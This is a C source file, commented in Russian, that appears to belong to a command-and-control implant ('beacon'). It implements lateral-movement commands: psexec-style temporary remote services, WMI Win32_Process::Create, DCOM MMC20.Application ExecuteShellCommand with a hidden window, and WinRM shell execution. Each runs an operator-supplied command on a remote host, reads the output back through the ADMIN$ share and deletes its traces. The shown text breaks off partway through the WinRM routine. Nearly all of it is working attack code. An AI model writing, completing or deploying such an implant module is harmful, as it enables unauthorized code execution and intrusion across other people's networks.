// cmd_lateral.c — Lateral movement: psexec_cmd + wmiexec
//
// psexec_cmd: создаёт временный SCM-сервис на цели, запускает команду через
//             cmd.exe, читает вывод через \\target\ADMIN$ и удаляет сервис.
//
// wmiexec:    вызывает Win32_Process::Create через WMI, читает вывод через
//             \\target\ADMIN$ (без записи service на диск).
//
// KV-параметры: target (hostname/IP), cmd (shell-команда)
// Требования:  токен с правами Local Admin на цели + ADMIN$ share
//
// MIDL_user_allocate/free и __C_specific_handler определены в cmd_ldap_relay.c.

#include "../core/beacon.h"
#include <bcrypt.h>
#include <oaidl.h>      // VARIANT, BSTR
#include <oleauto.h>    // SysAllocString, SysFreeString, VariantInit, VariantClear
#include <wbemidl.h>    // IWbemLocator, IWbemServices, IWbemClassObject

// GUIDs определены вручную — wbemuuid.lib не нужен
static const CLSID s_CLSID_WbemLocator =
    {0x4590F811,0x1D3A,0x11D0,{0x89,0x1F,0x00,0xAA,0x00,0x4B,0x2E,0x24}};
static const IID s_IID_IWbemLocator =
    {0xDC12A687,0x737F,0x11CF,{0x88,0x4D,0x00,0xAA,0x00,0x4B,0x2E,0x24}};

// ================================================================
// Вспомогательные функции
// ================================================================

static void lat_to_wide(const char* u8, wchar_t* dst, int cap) {
    MultiByteToWideChar(CP_UTF8, 0, u8, -1, dst, cap);
}

// Конкатенация wide-строк без CRT
static void lat_wcat(wchar_t* dst, int cap, const wchar_t* src) {
    int di = 0;
    while (dst[di]) di++;
    for (int si = 0; src[si] && di < cap - 1; si++, di++) dst[di] = src[si];
    dst[di] = 0;
}

// 8 случайных hex-символов (BCrypt, не требует hAlg)
static void lat_rand_hex8(wchar_t out[9]) {
    static const wchar_t h[] = L"0123456789ABCDEF";
    DWORD v = 0;
    BCryptGenRandom(NULL, (PUCHAR)&v, 4, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    for (int i = 7; i >= 0; i--) { out[i] = h[v & 0xF]; v >>= 4; }
    out[8] = 0;
}

// Читает файл по UNC в bcalloc-буфер. Вызывающий bfree() буфер.
// Лимит 4 МБ — достаточно для любого вывода команды.
static BYTE* lat_read_file(const wchar_t* path, DWORD* out_len) {
    LARGE_INTEGER sz;
    DWORD rd = 0;
    BYTE* buf = NULL;
    *out_len = 0;
    HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;
    sz.QuadPart = 0;
    if (!GetFileSizeEx(h, &sz) || sz.QuadPart == 0 || sz.QuadPart > 4u * 1024u * 1024u)
        goto done;
    buf = (BYTE*)bcalloc((DWORD)sz.QuadPart + 1);
    if (!buf) goto done;
    ReadFile(h, buf, (DWORD)sz.QuadPart, &rd, NULL);
    *out_len = rd;
done:
    CloseHandle(h);
    if (buf && rd == 0) { bfree(buf); buf = NULL; }
    return buf;
}

// Вывод ошибки с кодом DWORD без CRT (используется также в cmd_portfwd.c)
void lat_err(const char* prefix, DWORD code) {
    char msg[128];
    int  pi = 0;
    while (prefix[pi] && pi < 96) { msg[pi] = prefix[pi]; pi++; }
    char tmp[12]; int ni = 0;
    DWORD v = code;
    if (!v) { tmp[ni++] = '0'; }
    else { while (v) { tmp[ni++] = (char)('0' + v % 10); v /= 10; } }
    for (int i = ni - 1; i >= 0 && pi < 126; i--) msg[pi++] = tmp[i];
    msg[pi++] = '\n'; msg[pi] = 0;
    out_write(msg, (DWORD)pi);
}

// ================================================================
// psexec_cmd — создание временного SCM-сервиса
// ================================================================

void cmd_psexec_cmd(const BeaconTask* t)
{
    char    tgt_u8[256]   = {0};
    char    cmd_u8[2048]  = {0};
    wchar_t wTgt[256]     = {0};
    wchar_t wCmd[2048]    = {0};
    wchar_t rnd[9]        = {0};
    wchar_t svcName[16]   = {0};
    wchar_t tmpRemote[128]= {0};
    wchar_t uncPath[512]  = {0};
    wchar_t scmHost[520]  = {0};
    wchar_t sysDir[MAX_PATH] = {0};
    wchar_t binPath[4096] = {0};
    SC_HANDLE hScm = NULL, hSvc = NULL;
    SERVICE_STATUS ss;
    DWORD outLen = 0;
    BYTE* outBuf = NULL;

    if (!kv_get_str(t->pay, t->pay_len, "target", tgt_u8, sizeof(tgt_u8)) ||
        !kv_get_str(t->pay, t->pay_len, "cmd",    cmd_u8,  sizeof(cmd_u8))) {
        out_write("psexec_cmd: missing target or cmd\n", 33);
        return;
    }
    lat_to_wide(tgt_u8, wTgt, 256);
    lat_to_wide(cmd_u8, wCmd, 2048);
    lat_rand_hex8(rnd);

    // Имя сервиса: "SVC" + 8 hex-символов
    lat_wcat(svcName, 16, L"SVC");
    lat_wcat(svcName, 16, rnd);

    // Путь к temp-файлу на цели: C:\Windows\Temp\XXXXXXXX.tmp
    lat_wcat(tmpRemote, 128, L"C:\\Windows\\Temp\\");
    lat_wcat(tmpRemote, 128, rnd);
    lat_wcat(tmpRemote, 128, L".tmp");

    // UNC для чтения через SMB: \\target\ADMIN$\Temp\XXXXXXXX.tmp
    lat_wcat(uncPath, 512, L"\\\\");
    lat_wcat(uncPath, 512, wTgt);
    lat_wcat(uncPath, 512, L"\\ADMIN$\\Temp\\");
    lat_wcat(uncPath, 512, rnd);
    lat_wcat(uncPath, 512, L".tmp");

    // Хост для SCM: \\target
    lat_wcat(scmHost, 520, L"\\\\");
    lat_wcat(scmHost, 520, wTgt);

    // Команда сервиса: <sysDir>\cmd.exe /c "<cmd> 1> <tmpRemote> 2>&1"
    GetSystemDirectoryW(sysDir, MAX_PATH);
    lat_wcat(binPath, 4096, sysDir);
    lat_wcat(binPath, 4096, L"\\cmd.exe /c \"");
    lat_wcat(binPath, 4096, wCmd);
    lat_wcat(binPath, 4096, L" 1> ");
    lat_wcat(binPath, 4096, tmpRemote);
    lat_wcat(binPath, 4096, L" 2>&1\"");

    hScm = OpenSCManagerW(scmHost, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hScm) {
        lat_err("psexec_cmd: OpenSCManager failed: ", GetLastError());
        return;
    }

    hSvc = CreateServiceW(hScm, svcName, svcName,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        binPath, NULL, NULL, NULL, NULL, NULL);
    if (!hSvc) {
        lat_err("psexec_cmd: CreateService failed: ", GetLastError());
        CloseServiceHandle(hScm);
        return;
    }

    StartServiceW(hSvc, 0, NULL);

    // Ждём завершения команды: сервис → STOPPED или файл появился (макс 15 с)
    rt_memset(&ss, 0, sizeof(ss));
    for (int i = 0; i < 30; i++) {
        Sleep(500);
        if (QueryServiceStatus(hSvc, &ss) &&
            ss.dwCurrentState == SERVICE_STOPPED) break;
        if (GetFileAttributesW(uncPath) != INVALID_FILE_ATTRIBUTES) break;
    }
    Sleep(500); // Дополнительный буфер для сброса файла

    outBuf = lat_read_file(uncPath, &outLen);
    if (outBuf && outLen) {
        out_write((char*)outBuf, outLen);
        bfree(outBuf);
    } else {
        out_write("psexec_cmd: no output (command may still be running)\n", 53);
    }

    // Очистка
    DeleteService(hSvc);
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hScm);
    DeleteFileW(uncPath);
    out_flush_chunk(get_transport(), 0);
}

// ================================================================
// wmiexec — WMI Win32_Process::Create (без записи сервиса)
// ================================================================

void cmd_wmiexec(const BeaconTask* t)
{
    char    tgt_u8[256]     = {0};
    char    cmd_u8[2048]    = {0};
    wchar_t wTgt[256]       = {0};
    wchar_t wCmd[2048]      = {0};
    wchar_t rnd[9]          = {0};
    wchar_t tmpRemote[128]  = {0};
    wchar_t uncPath[512]    = {0};
    wchar_t wmiNs[512]      = {0};
    wchar_t sysDir[MAX_PATH]= {0};
    wchar_t fullCmd[4096]   = {0};
    HRESULT hrInit, hr;
    BOOL    bUninit         = FALSE;
    IWbemLocator*     pLoc    = NULL;
    IWbemServices*    pSvc    = NULL;
    IWbemClassObject* pClass  = NULL;
    IWbemClassObject* pInDef  = NULL;
    IWbemClassObject* pInPar  = NULL;
    IWbemClassObject* pOutPar = NULL;
    DWORD outLen = 0;
    BYTE* outBuf = NULL;

    if (!kv_get_str(t->pay, t->pay_len, "target", tgt_u8, sizeof(tgt_u8)) ||
        !kv_get_str(t->pay, t->pay_len, "cmd",    cmd_u8,  sizeof(cmd_u8))) {
        out_write("wmiexec: missing target or cmd\n", 30);
        return;
    }
    lat_to_wide(tgt_u8, wTgt, 256);
    lat_to_wide(cmd_u8, wCmd, 2048);
    lat_rand_hex8(rnd);

    // Путь к temp-файлу на цели
    lat_wcat(tmpRemote, 128, L"C:\\Windows\\Temp\\");
    lat_wcat(tmpRemote, 128, rnd);
    lat_wcat(tmpRemote, 128, L".tmp");

    // UNC для чтения через SMB
    lat_wcat(uncPath, 512, L"\\\\");
    lat_wcat(uncPath, 512, wTgt);
    lat_wcat(uncPath, 512, L"\\ADMIN$\\Temp\\");
    lat_wcat(uncPath, 512, rnd);
    lat_wcat(uncPath, 512, L".tmp");

    // WMI namespace: \\target\root\cimv2
    lat_wcat(wmiNs, 512, L"\\\\");
    lat_wcat(wmiNs, 512, wTgt);
    lat_wcat(wmiNs, 512, L"\\root\\cimv2");

    // Команда для WMI: <sysDir>\cmd.exe /c "<cmd> 1> <tmpRemote> 2>&1"
    GetSystemDirectoryW(sysDir, MAX_PATH);
    lat_wcat(fullCmd, 4096, sysDir);
    lat_wcat(fullCmd, 4096, L"\\cmd.exe /c \"");
    lat_wcat(fullCmd, 4096, wCmd);
    lat_wcat(fullCmd, 4096, L" 1> ");
    lat_wcat(fullCmd, 4096, tmpRemote);
    lat_wcat(fullCmd, 4096, L" 2>&1\"");

    // COM-инициализация; если уже инициализирован — не деинициализируем
    hrInit  = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    bUninit = (hrInit != RPC_E_CHANGED_MODE && SUCCEEDED(hrInit));

    hr = CoCreateInstance(&s_CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
                          &s_IID_IWbemLocator, (void**)&pLoc);
    if (FAILED(hr) || !pLoc) {
        lat_err("wmiexec: CoCreateInstance failed: ", (DWORD)hr);
        goto wmi_done;
    }

    {
        BSTR bsNs = SysAllocString(wmiNs);
        hr = pLoc->lpVtbl->ConnectServer(pLoc, bsNs, NULL, NULL, NULL, 0, NULL, NULL, &pSvc);
        SysFreeString(bsNs);
    }
    pLoc->lpVtbl->Release(pLoc); pLoc = NULL;
    if (FAILED(hr) || !pSvc) {
        lat_err("wmiexec: ConnectServer failed: ", (DWORD)hr);
        goto wmi_done;
    }

    // Аутентификация: NTLM-имперсонация текущего токена
    CoSetProxyBlanket((IUnknown*)(void*)pSvc,
        RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL, EOAC_NONE);

    {
        BSTR bsCls = SysAllocString(L"Win32_Process");
        hr = pSvc->lpVtbl->GetObject(pSvc, bsCls, 0, NULL, &pClass, NULL);
        SysFreeString(bsCls);
    }
    if (FAILED(hr) || !pClass) {
        lat_err("wmiexec: GetObject(Win32_Process) failed: ", (DWORD)hr);
        goto wmi_done;
    }

    hr = pClass->lpVtbl->GetMethod(pClass, L"Create", 0, &pInDef, NULL);
    pClass->lpVtbl->Release(pClass); pClass = NULL;
    if (FAILED(hr) || !pInDef) {
        lat_err("wmiexec: GetMethod(Create) failed: ", (DWORD)hr);
        goto wmi_done;
    }

    hr = pInDef->lpVtbl->SpawnInstance(pInDef, 0, &pInPar);
    pInDef->lpVtbl->Release(pInDef); pInDef = NULL;
    if (FAILED(hr) || !pInPar) {
        lat_err("wmiexec: SpawnInstance failed: ", (DWORD)hr);
        goto wmi_done;
    }

    {
        VARIANT v; VariantInit(&v);
        V_VT(&v)   = VT_BSTR;
        V_BSTR(&v) = SysAllocString(fullCmd);
        pInPar->lpVtbl->Put(pInPar, L"CommandLine", 0, &v, 0);
        VariantClear(&v);
    }

    {
        BSTR bsCls = SysAllocString(L"Win32_Process");
        BSTR bsMth = SysAllocString(L"Create");
        hr = pSvc->lpVtbl->ExecMethod(pSvc, bsCls, bsMth, 0, NULL, pInPar, &pOutPar, NULL);
        SysFreeString(bsMth);
        SysFreeString(bsCls);
    }
    pInPar->lpVtbl->Release(pInPar); pInPar = NULL;
    if (FAILED(hr)) {
        lat_err("wmiexec: ExecMethod failed: ", (DWORD)hr);
        goto wmi_done;
    }

    if (pOutPar) {
        VARIANT vRet; VariantInit(&vRet);
        pOutPar->lpVtbl->Get(pOutPar, L"ReturnValue", 0, &vRet, NULL, NULL);
        if (V_UI4(&vRet) != 0) {
            lat_err("wmiexec: Win32_Process::Create returned: ", V_UI4(&vRet));
            VariantClear(&vRet);
            goto wmi_done;
        }
        VariantClear(&vRet);
        pOutPar->lpVtbl->Release(pOutPar); pOutPar = NULL;
    }

    // Ждём появления файла вывода (макс 15 с)
    for (int i = 0; i < 30; i++) {
        Sleep(500);
        if (GetFileAttributesW(uncPath) != INVALID_FILE_ATTRIBUTES) break;
    }
    Sleep(500);

    outBuf = lat_read_file(uncPath, &outLen);
    if (outBuf && outLen) {
        out_write((char*)outBuf, outLen);
        bfree(outBuf);
    } else {
        out_write("wmiexec: no output (process may still be running)\n", 50);
    }
    DeleteFileW(uncPath);
    out_flush_chunk(get_transport(), 0);

wmi_done:
    if (pOutPar) pOutPar->lpVtbl->Release(pOutPar);
    if (pInPar)  pInPar->lpVtbl->Release(pInPar);
    if (pInDef)  pInDef->lpVtbl->Release(pInDef);
    if (pClass)  pClass->lpVtbl->Release(pClass);
    if (pSvc)    pSvc->lpVtbl->Release(pSvc);
    if (pLoc)    pLoc->lpVtbl->Release(pLoc);
    if (bUninit) CoUninitialize();
}

// ================================================================
// Общие вспомогательные функции для DCOM и WinRM
// ================================================================

// IID_NULL — второй аргумент IDispatch::Invoke и GetIDsOfNames
static const IID s_lat_iid_null =
    {0,0,0,{0,0,0,0,0,0,0,0}};
// IID_IDispatch — запрашивается через CoCreateInstanceEx
static const IID s_lat_iid_idisp =
    {0x00020400,0x0000,0x0000,{0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46}};

// Универсальный вызов IDispatch-метода / обращение к свойству.
// rargs — аргументы в ОБРАТНОМ порядке (соглашение DISPPARAMS).
// out может быть NULL если результат не нужен.
static HRESULT lat_dcall(IDispatch* obj, const wchar_t* name,
    WORD wFlags, VARIANT* rargs, UINT nargs, VARIANT* out)
{
    DISPID     id  = DISPID_UNKNOWN;
    LPOLESTR   nm  = (LPOLESTR)name;
    HRESULT    hr  = obj->lpVtbl->GetIDsOfNames(obj, &s_lat_iid_null,
                         &nm, 1, LOCALE_USER_DEFAULT, &id);
    if (FAILED(hr)) return hr;
    DISPPARAMS dp;
    rt_memset(&dp, 0, sizeof(dp));
    dp.rgvarg = rargs;
    dp.cArgs  = nargs;
    if (out) VariantInit(out);
    return obj->lpVtbl->Invoke(obj, id, &s_lat_iid_null, LOCALE_USER_DEFAULT,
        wFlags, &dp, out, NULL, NULL);
}

// ================================================================
// dcomexec — DCOM MMC20.Application удалённое выполнение команды
// ================================================================

// CLSID_MMC20App = {49B2791A-B1AE-4C90-9B8E-E860BA07F889}
// Не требует активной сессии пользователя на цели.
static const CLSID s_CLSID_MMC20App =
    {0x49B2791A,0xB1AE,0x4C90,{0x9B,0x8E,0xE8,0x60,0xBA,0x07,0xF8,0x89}};

void cmd_dcomexec(const BeaconTask* t)
{
    char    tgt_u8[256]        = {0};
    char    cmd_u8[2048]       = {0};
    wchar_t wTgt[256]          = {0};
    wchar_t wCmd[2048]         = {0};
    wchar_t rnd[9]             = {0};
    wchar_t tmpRemote[128]     = {0};
    wchar_t uncPath[512]       = {0};
    wchar_t sysDir[MAX_PATH]   = {0};
    wchar_t cmdExe[MAX_PATH+8] = {0};
    wchar_t params[4096]       = {0};
    HRESULT hrInit, hr;
    BOOL       bUninit = FALSE;
    IDispatch* pApp    = NULL;
    IDispatch* pDoc    = NULL;
    IDispatch* pView   = NULL;
    BYTE*      outBuf  = NULL;
    DWORD      outLen  = 0;

    if (!kv_get_str(t->pay, t->pay_len, "target", tgt_u8, sizeof(tgt_u8)) ||
        !kv_get_str(t->pay, t->pay_len, "cmd",    cmd_u8,  sizeof(cmd_u8))) {
        out_write("dcomexec: missing target or cmd\n", 32);
        return;
    }
    lat_to_wide(tgt_u8, wTgt, 256);
    lat_to_wide(cmd_u8, wCmd, 2048);
    lat_rand_hex8(rnd);

    lat_wcat(tmpRemote, 128, L"C:\\Windows\\Temp\\");
    lat_wcat(tmpRemote, 128, rnd);
    lat_wcat(tmpRemote, 128, L".tmp");

    lat_wcat(uncPath, 512, L"\\\\");
    lat_wcat(uncPath, 512, wTgt);
    lat_wcat(uncPath, 512, L"\\ADMIN$\\Temp\\");
    lat_wcat(uncPath, 512, rnd);
    lat_wcat(uncPath, 512, L".tmp");

    GetSystemDirectoryW(sysDir, MAX_PATH);
    lat_wcat(cmdExe, MAX_PATH + 8, sysDir);
    lat_wcat(cmdExe, MAX_PATH + 8, L"\\cmd.exe");

    // Параметры ExecuteShellCommand: /c "cmd 1> tmpFile 2>&1"
    lat_wcat(params, 4096, L"/c \"");
    lat_wcat(params, 4096, wCmd);
    lat_wcat(params, 4096, L" 1> ");
    lat_wcat(params, 4096, tmpRemote);
    lat_wcat(params, 4096, L" 2>&1\"");

    hrInit  = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    bUninit = (hrInit != RPC_E_CHANGED_MODE && SUCCEEDED(hrInit));

    // Удалённый DCOM: CoCreateInstanceEx + COSERVERINFO
    COSERVERINFO srvInfo;
    rt_memset(&srvInfo, 0, sizeof(srvInfo));
    srvInfo.pwszName = wTgt;

    MULTI_QI qi;
    rt_memset(&qi, 0, sizeof(qi));
    qi.pIID = &s_lat_iid_idisp;

    hr = CoCreateInstanceEx(&s_CLSID_MMC20App, NULL,
        CLSCTX_REMOTE_SERVER, &srvInfo, 1, &qi);
    if (FAILED(hr) || FAILED(qi.hr) || !qi.pItf) {
        lat_err("dcomexec: CoCreateInstanceEx failed: ",
            FAILED(hr) ? (DWORD)hr : (DWORD)qi.hr);
        goto dcom_done;
    }
    pApp = (IDispatch*)qi.pItf;

    // pApp.Document → pDoc
    {
        VARIANT v;
        hr = lat_dcall(pApp, L"Document", DISPATCH_PROPERTYGET, NULL, 0, &v);
        if (FAILED(hr) || V_VT(&v) != VT_DISPATCH || !V_DISPATCH(&v)) {
            lat_err("dcomexec: get Document failed: ", (DWORD)hr);
            VariantClear(&v);
            goto dcom_done;
        }
        pDoc = V_DISPATCH(&v);
        pDoc->lpVtbl->AddRef(pDoc);
        VariantClear(&v);
    }

    // pDoc.ActiveView → pView
    {
        VARIANT v;
        hr = lat_dcall(pDoc, L"ActiveView", DISPATCH_PROPERTYGET, NULL, 0, &v);
        if (FAILED(hr) || V_VT(&v) != VT_DISPATCH || !V_DISPATCH(&v)) {
            lat_err("dcomexec: get ActiveView failed: ", (DWORD)hr);
            VariantClear(&v);
            goto dcom_done;
        }
        pView = V_DISPATCH(&v);
        pView->lpVtbl->AddRef(pView);
        VariantClear(&v);
    }

    // pView.ExecuteShellCommand(cmd, dir, params, windowState)
    // DISPPARAMS: аргументы передаются В ОБРАТНОМ порядке
    {
        BSTR bCmd    = SysAllocString(cmdExe);
        BSTR bDir    = SysAllocString(L"C:\\");
        BSTR bParams = SysAllocString(params);
        BSTR bWin    = SysAllocString(L"7");  // SW_SHOWMINNOACTIVE = скрытое окно

        VARIANT args[4];
        VariantInit(&args[0]); V_VT(&args[0]) = VT_BSTR; V_BSTR(&args[0]) = bWin;    // 4-й
        VariantInit(&args[1]); V_VT(&args[1]) = VT_BSTR; V_BSTR(&args[1]) = bParams; // 3-й
        VariantInit(&args[2]); V_VT(&args[2]) = VT_BSTR; V_BSTR(&args[2]) = bDir;    // 2-й
        VariantInit(&args[3]); V_VT(&args[3]) = VT_BSTR; V_BSTR(&args[3]) = bCmd;    // 1-й

        hr = lat_dcall(pView, L"ExecuteShellCommand", DISPATCH_METHOD, args, 4, NULL);

        SysFreeString(bCmd); SysFreeString(bDir);
        SysFreeString(bParams); SysFreeString(bWin);
    }
    if (FAILED(hr)) {
        lat_err("dcomexec: ExecuteShellCommand failed: ", (DWORD)hr);
        goto dcom_done;
    }

    // Ждём файл вывода (макс 15 с)
    for (int i = 0; i < 30; i++) {
        Sleep(500);
        if (GetFileAttributesW(uncPath) != INVALID_FILE_ATTRIBUTES) break;
    }
    Sleep(500);

    outBuf = lat_read_file(uncPath, &outLen);
    if (outBuf && outLen) {
        out_write((char*)outBuf, outLen);
        bfree(outBuf);
    } else {
        out_write("dcomexec: no output\n", 20);
    }
    DeleteFileW(uncPath);
    out_flush_chunk(get_transport(), 0);

dcom_done:
    if (pView) pView->lpVtbl->Release(pView);
    if (pDoc)  pDoc->lpVtbl->Release(pDoc);
    if (pApp)  pApp->lpVtbl->Release(pApp);
    if (bUninit) CoUninitialize();
}

// ================================================================
// winrmexec — WinRM (WS-Management) удалённое выполнение
// ================================================================

// CLSID_WSMan = {BCED617B-EC03-420b-8508-977DC7A686BD}
static const CLSID s_CLSID_WSMan_lat =
    {0xBCED617B,0xEC03,0x420b,{0x85,0x08,0x97,0x7D,0xC7,0xA6,0x86,0xBD}};

// Поиск подстроки в широкой строке; возвращает указатель ПОСЛЕ needle или NULL.
static const WCHAR* wrm_after(const WCHAR* hay, const WCHAR* needle) {
    if (!hay || !needle) return NULL;
    for (; *hay; hay++) {
        const WCHAR* h = hay;
        const WCHAR* n = needle;
        while (*n && *h == *n) { h++; n++; }
        if (!*n) return h;
    }
    return NULL;
}

// Копировать символы из src пока не встретится term (или конец буфера).
static void wrm_extract(const WCHAR* src, WCHAR term, WCHAR* dst, int max) {
    int i = 0;
    while (src[i] && src[i] != term && i < max - 1) { dst[i] = src[i]; i++; }
    dst[i] = 0;
}

void cmd_winrmexec(const BeaconTask* t)
{
    char    tgt_u8[256]     = {0};
    char    cmd_u8[2048]    = {0};
    wchar_t wTgt[256]       = {0};
    wchar_t wCmd[2048]      = {0};
    wchar_t rnd[9]          = {0};
    wchar_t tmpRemote[128]  = {0};
    wchar_t uncPath[512]    = {0};
    wchar_t sessUrl[320]    = {0};
    wchar_t shellId[64]     = {0};
    wchar_t shellUriId[512] = {0};
    wchar_t cmdXml[8192]    = {0};
    wchar_t sigXml[512]     = {0};
    HRESULT hrInit, hr;
    BOOL       bUninit = FALSE;
    IDispatch* pWsm    = NULL;
    IDispatch* pSess   = NULL;
    BSTR       bResult = NULL;
    BYTE*      outBuf  = NULL;
    DWORD      outLen  = 0;

    // URI-константы WS-Management
    static const wchar_t kShellUri[] =
        L"http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd";
    static const wchar_t kCmdAction[] =
        L"http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command";
    static const wchar_t kSignalAction[] =
        L"http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Signal";
    static const wchar_t kNs[] =
        L"http://schemas.microsoft.com/wbem/wsman/1/windows/shell";

    if (!kv_get_str(t->pay, t->pay_len, "target", tgt_u8, sizeof(tgt_u8)) ||
        !kv_get_str(t->pay, t->pay_len, "cmd",    cmd_u8,  sizeof(cmd_u8))) {
        out_write("winrmexec: missing target or cmd\n", 33);
        return;
    }
    lat_to_wide(tgt_u8, wTgt, 256);
    lat_to_wide(cmd_u8, wCmd, 2048);
    lat_rand_hex8(rnd);

    lat_wcat(tmpRemote, 128, L"C:\\Windows\\Temp\\");
    lat_wcat(tmpRemote, 128, rnd);
    lat_wcat(tmpRemote, 128, L".tmp");

    lat_wcat(uncPath, 512, L"\\\\");
    lat_wcat(uncPath, 512, wTgt);
    lat_wcat(uncPath, 512, L"\\ADMIN$\\Temp\\");
    lat_wcat(uncPath, 512, rnd);
    lat_wcat(uncPath, 512, L".tmp");

    // URL сессии WinRM: HTTP порт 5985
    lat_wcat(sessUrl, 320, L"http://");
    lat_wcat(sessUrl, 320, wTgt);
    lat_wcat(sessUrl, 320, L":5985/wsman");

    hrInit  = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    bUninit = (hrInit != RPC_E_CHANGED_MODE && SUCCEEDED(hrInit));

    hr = CoCreateInstance(&s_CLSID_WSMan_lat, NULL, CLSCTX_INPROC_SERVER,
                          &s_lat_iid_idisp, (void**)&pWsm);
    if (FAILED(hr) || !pWsm) {
        lat_err("winrmexec: CoCreateInstance(WSMan) failed: ", (DWORD)hr);
        goto wrm_done;
    }

    // IWSMan.CreateSession(url, flags=0, options=NULL) → IDispatch*
    // DISPPARAMS reversed: [options, flags, url]
    {
        VARIANT args[3];
        VariantInit(&args[0]);
        V_VT(&args[0])    = VT_ERROR;
        V_ERROR(&args[0]) = DISP_E_PARAMNOTFOUND;  // options — необязательный
        VariantInit(&args[1]);
        V_VT(&args[1])   = VT_I4;
        V_I4(&args[1])   = 0;                      // flags
        VariantInit(&args[2]);
        V_VT(&args[2])   = VT_BSTR;
        V_BSTR(&args[2]) = SysAllocString(sessUrl);

        VARIANT vSess;
        hr = lat_dcall(pWsm, L"CreateSession", DISPATCH_METHOD, args, 3, &vSess);
        SysFreeString(V_BSTR(&args[2]));
        pWsm->lpVtbl->Release(pWsm); pWsm = NULL;

        if (FAILED(hr) || V_VT(&vSess) != VT_DISPATCH || !V_DISPATCH(&vSess)) {
            lat_err("winrmexec: CreateSession failed: ", (DWORD)hr);
            VariantClear(&vSess);
            goto wrm_done;
        }
        pSess = V_DISPATCH(&vSess);
        pSess->lpVtbl->AddRef(pSess);
        VariantClear(&vSess);
    }

    // IWSManSession.Create(resource_uri, shell_xml, flags=0) → BSTR с ShellId
    // DISPPARAMS reversed: [flags, xml, uri]
    {
        wchar_t shellXml[512] = {0};
        lat_wcat(shellXml, 512, L"<rsp:Shell xmlns:rsp=\"");
        lat_wcat(shellXml, 512, kNs);
        lat_wcat(shellXml, 512,
            L"\"><rsp:Environment/>"
            L"<rsp:WorkingDirectory>C:\\</rsp:WorkingDirectory>"
            L"</rsp:Shell>");

        VARIANT args[3];
        VariantInit(&args[0]); V_VT(&args[0]) = VT_I4;   V_I4(&args[0])   = 0;
        VariantInit(&args[1]); V_VT(&args[1]) = VT_BSTR; V_BSTR(&args[1]) = SysAllocString(shellXml);
        VariantInit(&args[2]); V_VT(&args[2]) = VT_BSTR; V_BSTR(&args[2]) = SysAllocString(kShellUri);

        VARIANT vRes;
        hr = lat_dcall(pSess, L"Create", DISPATCH_METHOD, args, 3, &vRes);
        SysFreeString(V_BSTR(&args[2]));
        SysFreeString(V_BSTR(&args[1]));
        if (SUCCEEDED(hr) && V_VT(&vRes) == VT_BSTR) {
            bResult = V_BSTR(&vRes);
            V_VT(&vRes) = VT_EMPTY;  // забираем BSTR без автоматического SysFree
        }
        VariantClear(&vRes);
    }
    if (FAILED(hr) || !bResult) {
        lat_err("winrmexec: Create shell failed: ", (DWORD)hr);
        goto wrm_done;
    }

    // Парсим ShellId: ищем ...ShellId">GUID< в XML-ответе
    {
        const WCHAR* p = wrm_after(bResult, L"ShellId\">");
        if (p) wrm_extract(p, L'<', shellId, 64);
    }
    SysFreeString(bResult); bResult = NULL;

    if (!shellId[0]) {
        out_write("winrmexec: could not parse ShellId\n", 35);
        goto wrm_done;
    }

    // URI ресурса с ShellId для последующих Invoke/Delete
    lat_wcat(shellUriId, 512, kShellUri);
    lat_wcat(shellUriId, 512, L"?ShellId=");
    lat_wcat(shellUriId, 512, shellId);

    // IWSManSession.Invoke(action, resource, cmd_xml, 0) → выполнить команду
    // DISPPARAMS reversed: [flags, params, resource, action]
    {
        lat_wcat(cmdXml, 8192, L"<rsp:CommandLine xmlns:rsp=\"");
        lat_wcat(cmdXml, 8192, kNs);
        lat_wcat(cmdXml, 8192,
            L"\"><rsp:Command>cmd.exe</rsp:Command>"
            L"<rsp:Arguments>/c \"");
        lat_wcat(cmdXml, 8192, wCmd);
        lat_wcat(cmdXml, 8192, L" 1> ");
        lat_wcat(cmdXml, 8192, tmpRemote);
        lat_wcat(cmdXml, 8192,
            L" 2>&amp;1\"</rsp:Arguments>"
            L"</rsp:CommandLine>");

        VARIANT args[4];
        VariantInit(&args[0]); V_VT(&args[0]) = VT_I4;   V_I4(&args[0])   = 0;
        VariantInit(&args[1]); V_VT(&args[1]) = VT_BSTR; V_BSTR(&args[1]) = SysAllocString(cmdXml);
        VariantInit(&args[2]); V_VT(&args[2]) = VT_BSTR; V_BSTR(&args[2]) = SysAllocString(shellUriId);
        VariantInit(&args[3]); V_VT(&args[3]) = VT_BSTR; V_BSTR(&args[3]) = SysAllocString(kCmdAction);

        VARIANT vRes;
        hr = lat_dcall(pSess, L"Invoke", DISPATCH_METHOD, args, 4, &vRes);
        SysFreeString(V_BSTR(&args[3]));
        SysFreeString(V_BSTR(&args[2]));
        SysFreeString(V_BSTR(&args[1]));
        VariantClear(&vRes);
    }
    if (FAILED(hr)) {
        lat_err("winrmexec: Invoke(Command) failed: ", (DWORD)hr);
        goto wrm_done;
    }

    // Ждём файл вывода (макс 30 с)
    for (int i = 0; i < 60; i++) {
        Sleep(500);
        if (GetFileAttributesW(uncPath) != INVALID_FILE_ATTRIBUTES) break;
    }
    Sleep(500);

    outBuf = lat_read_file(uncPath, &outLen);
    if (outBuf && outLen) {
        out_write((char*)outBuf, outLen);
        bfree(outBuf);
    } else {
        out_write("winrmexec: no output\n", 21);
    }
    DeleteFileW(uncPath);

    // Signal terminate → Delete shell
    {
        lat_wcat(sigXml, 512, L"<rsp:Signal xmlns:rsp=\"");
        lat_wcat(sigXml, 512, kNs);
